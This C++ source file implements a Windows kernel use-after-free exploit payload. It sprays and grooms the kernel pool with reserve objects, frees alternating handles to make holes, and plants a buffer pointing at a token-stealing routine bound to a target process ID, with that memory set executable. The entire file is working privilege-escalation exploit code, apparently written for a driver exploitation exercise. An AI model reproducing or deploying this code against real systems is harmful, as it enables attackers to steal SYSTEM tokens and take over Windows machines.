#include "payload_use_after_free.h"

namespace payload_use_after_free {

	bool PayloadUseAfterFree :: prepare_memory() {
		for (unsigned int i = 0; i < poolDefragSz; i++) {
//			hReserveObjectsDefrag[i] = CreateEvent(NULL, false, false, NULL);
			if (!NT_SUCCESS(_NtAllocateFunc(&hReserveObjectsDefrag[i], 0, IOCO))) {
				return false;
			}
		}

		for (unsigned int i = 0; i < poolGroomSz; i++) {
//			hReserveObjectsPoolGroom[i] = CreateEvent(NULL, false, false, NULL);
			if (!NT_SUCCESS(_NtAllocateFunc(&hReserveObjectsPoolGroom[i], 0, IOCO))) {
				return false;
			}
		}

		// Windows Kernel Pool Spraying
		for (unsigned int i = 1; i < poolGroomSz; i += 2) {
			if ((NULL != hReserveObjectsPoolGroom[i]) && 
				(INVALID_HANDLE_VALUE != hReserveObjectsPoolGroom[i])){
				CloseHandle(hReserveObjectsPoolGroom[i]);
				hReserveObjectsPoolGroom[i] = 0;
			}
		}
		return true;
	}

	bool PayloadUseAfterFree::prepare_payload() {
		auto b_res = false;
		const size_t payloadSz = sizeof(payload_use_after_free::BUFFER_FUNC);
		if (NULL != (_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSz))) {
			memset(_buffer, 0x41, payloadSz);
			*(__int64*)_buffer = (__int64)&TokenStealingPayloadUAF;

			if (payloads::set_pid_to_payload(_targetPid, TokenStealingPayloadUAF) &&
				payloads::set_memory_permission(PAGE_EXECUTE_READ)) {
				b_res = true;
			}
		}
		return b_res;
	}

	void PayloadUseAfterFree::clear() {
		for (unsigned int i = 0; i < poolDefragSz; i++) {
			if ((NULL != hReserveObjectsDefrag[i]) &&
				(INVALID_HANDLE_VALUE != hReserveObjectsDefrag[i])) {
				CloseHandle(hReserveObjectsDefrag[i]);
				hReserveObjectsDefrag[i] = 0;
			}
		}
		for (unsigned int i = 0; i < poolGroomSz; i += 2) {
			if ((NULL != hReserveObjectsPoolGroom[i]) &&
				(INVALID_HANDLE_VALUE != hReserveObjectsPoolGroom[i])) {
				CloseHandle(hReserveObjectsPoolGroom[i]);
				hReserveObjectsPoolGroom[i] = 0;
			}
		}
		if (_buffer) {
			if (payloads::set_memory_permission(PAGE_READWRITE)) {
				// Restore default 'PID' value in the payload
				payloads::set_pid_to_payload(payloads::g_dwDefaultPid, TokenStealingPayloadUAF);
				HeapFree(GetProcessHeap(), 0, _buffer);
			}
		}
	}
}